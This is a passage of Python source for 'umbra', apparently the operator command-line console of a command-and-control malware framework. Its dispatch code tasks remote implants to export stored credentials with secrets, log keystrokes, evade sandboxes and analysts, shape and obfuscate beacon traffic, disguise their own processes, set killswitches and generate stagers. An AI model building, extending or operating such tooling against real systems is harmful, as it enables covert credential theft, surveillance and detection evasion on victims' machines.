        elif args.cmd == "creds-export":
            print_credentials(
                client.creds_export(args.agent, args.kind, args.query),
                args.json, with_secrets=True)
        elif args.cmd == "evade-report":
            if args.agent:
                run_task_and_wait(client, console, args.agent, "evade.report", {},
                                  args.wait, args.timeout, args.json)
            else:
                print_postures(client.posture_report(), args.json)
        elif args.cmd == "evade-posture":
            evade_args: Dict[str, Any] = {}
            if args.silence is not None:
                evade_args["silence_on_sandbox"] = args.silence
            if args.slow is not None:
                evade_args["slow_on_sandbox"] = args.slow
            for name in ("virtual_factor", "sandbox_factor", "lab_factor",
                         "developer_factor", "jitter_bonus"):
                value = getattr(args, name)
                if value:
                    evade_args[name] = value
            run_task_and_wait(client, console, args.agent, "evade.posture", evade_args,
                              args.wait, args.timeout, args.json)
        elif args.cmd == "evade-profile":
            evade_args = {}
            for name in ("base", "busy_start", "busy_end", "busy_factor",
                         "night_factor", "weekend_factor"):
                value = getattr(args, name)
                if value:
                    evade_args[name] = value
            run_task_and_wait(client, console, args.agent, "evade.profile", evade_args,
                              args.wait, args.timeout, args.json)
        elif args.cmd == "evade-shape":
            evade_args = {}
            if args.mode:
                evade_args["mode"] = args.mode
            if args.size:
                evade_args["size"] = args.size
            if args.pad_every:
                evade_args["pad_every"] = args.pad_every
            if args.reorder is not None:
                evade_args["reorder"] = args.reorder
            run_task_and_wait(client, console, args.agent, "evade.shape", evade_args,
                              args.wait, args.timeout, args.json)
        elif args.cmd == "evade-killswitch":
            evade_args = {"clear": args.clear}
            if args.file:
                evade_args["file"] = args.file
            if args.registry:
                evade_args["registry"] = args.registry
            if args.at:
                evade_args["at"] = args.at
            if args.uptime:
                evade_args["uptime"] = args.uptime
            if args.marker:
                evade_args["marker"] = args.marker
            if args.note:
                evade_args["note"] = args.note
            run_task_and_wait(client, console, args.agent, "evade.killswitch", evade_args,
                              args.wait, args.timeout, args.json)
        elif args.cmd == "hygiene":
            evade_args = {}
            if args.copy:
                evade_args["copy"] = args.copy
            if args.name:
                evade_args["name"] = args.name
            if args.cwd:
                evade_args["cwd"] = args.cwd
            if args.clean_env:
                evade_args["clean_env"] = True
            if args.ppid:
                evade_args["ppid"] = args.ppid
            kind = "hygiene.process" if evade_args else "hygiene.memory"
            if args.memory:
                kind = "hygiene.memory"
            run_task_and_wait(client, console, args.agent, kind, evade_args,
                              args.wait, args.timeout, args.json)
        elif args.cmd == "update":
            run_task_and_wait(client, console, args.agent, "update",
                              {"path": args.path, "sha256": args.sha256},
                              args.wait, args.timeout, args.json)
        elif args.cmd == "keylog-file":
            run_task_and_wait(client, console, args.agent, "keylog.file",
                              {"path": args.path, "seconds": args.seconds},
                              args.wait, args.timeout, args.json)
        elif args.cmd == "tail":
            run_task_and_wait(client, console, args.agent, "tail",
                              {"path": args.path, "lines": args.lines},
                              args.wait, args.timeout, args.json)
        elif args.cmd == "hash":
            run_task_and_wait(client, console, args.agent, "hash",
                              {"path": args.path},
                              args.wait, args.timeout, args.json)
        elif args.cmd == "registry":
            run_task_and_wait(client, console, args.agent, "registry",
                              {"hive": args.hive, "key": args.key, "value": args.value},
                              args.wait, args.timeout, args.json)
        elif args.cmd == "proc":
            run_task_and_wait(client, console, args.agent, "ps", {},
                              args.wait, args.timeout, args.json)
        elif args.cmd == "proc-kill":
            target = args.target.strip()
            task_args: Dict[str, Any] = {}
            if target.isdigit():
                task_args["pid"] = int(target)
            else:
                task_args["name"] = target
            run_task_and_wait(client, console, args.agent, "proc.kill", task_args,
                              args.wait, args.timeout, args.json)
        elif args.cmd == "report":
            if args.all:
                text = build_engagement_report(client, args.limit, console.store)
            elif args.agent:
                text = build_report(client, args.agent, args.limit, console.store)
            else:
                print("usage: umbra report <agent> | umbra report --all",
                      file=sys.stderr)
                return 2
            if args.out:
                with open(args.out, "w", encoding="utf-8") as fh:
                    fh.write(text)
                if args.json:
                    emit({"agent": args.agent, "file": args.out, "bytes": len(text)})
                else:
                    print(f"wrote {args.out} ({len(text)} bytes)")
            else:
                print(text, end="")
        elif args.cmd == "browse":
            run_task_and_wait(client, console, args.agent, "find",
                              {"path": args.path, "name": "", "content": "", "max": args.max},
                              args.wait, args.timeout, args.json)
        elif args.cmd == "triage":
            run_task_and_wait(client, console, args.agent, "triage", {"path": args.path},
                              args.wait, args.timeout, args.json)
        elif args.cmd == "find":
            run_task_and_wait(client, console, args.agent, "find",
                              {"path": args.path, "name": args.name,
                               "content": args.content, "max": args.max},
                              args.wait, args.timeout, args.json)
        elif args.cmd == "netinfo":
            run_task_and_wait(client, console, args.agent, "netinfo", {},
                              args.wait, args.timeout, args.json)
        elif args.cmd == "policy":
            if args.sleep <= 0 and args.jitter <= 0 and args.obfuscate is None:
                print("usage: umbra policy <agent> --sleep N --jitter P "
                      "[--obfuscate|--no-obfuscate]", file=sys.stderr)
                return 2
            if not args.agent and not args.all:
                print("name an agent or pass --all with a filter", file=sys.stderr)
                return 2
            sleep = args.sleep if args.sleep > 0 else 60
            jitter = args.jitter if args.jitter > 0 else 20
            data = client.set_policy(
                sleep, jitter, obfuscate=args.obfuscate,
                agents=[args.agent] if args.agent else None,
                state=args.state, tag=args.tag,
            )
            updated = data.get("updated", [])
            if args.json:
                emit(data)
            else:
                print(f"policy pushed to {len(updated)} agent(s): "
                      f"sleep {sleep}s, jitter {jitter}%"
                      + ("" if args.obfuscate is None
                         else (", obfuscated" if args.obfuscate else ", fixed interval")))
        elif args.cmd == "tag":
            labels = [t.strip() for t in args.labels if t.strip()]
            if not labels:
                print("usage: umbra tag <agent> <label> [--remove|--set]", file=sys.stderr)
                return 2
            mode = "remove" if args.remove else ("set" if args.replace else "add")
            data = client.tag_agents(
                labels, mode=mode,
                agents=[args.agent] if args.agent else None,
                state=args.state, tag=args.match,
            )
            if args.json:
                emit(data)
            else:
                print(f"{mode}: {', '.join(labels)} on {len(data.get('updated', []))} agent(s)")
        elif args.cmd == "team-sync":
            data = client.team_sync()
            if args.json:
                emit(data)
            else:
                print_team(data)
        elif args.cmd == "stager":
            script = client.stager_generate(
                platform=args.platform,
                transport=args.transport,
                server=args.server,
                url=args.url,
                sha256=args.sha256,
                agent_id=args.agent_id,
            )
            print(script)
        else:  # pragma: no cover - argparse covers this
            print(f"unknown command {args.cmd}", file=sys.stderr)
            return 2
    except OperatorError as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 1
    finally:
        client.close()
        if store is not None:
            try:
                store.end_session(console.session)
            except Exception:  # noqa: BLE001
                pass
            store.close()
    return 0


if __name__ == "__main__":  # pragma: no cover
    raise SystemExit(main())
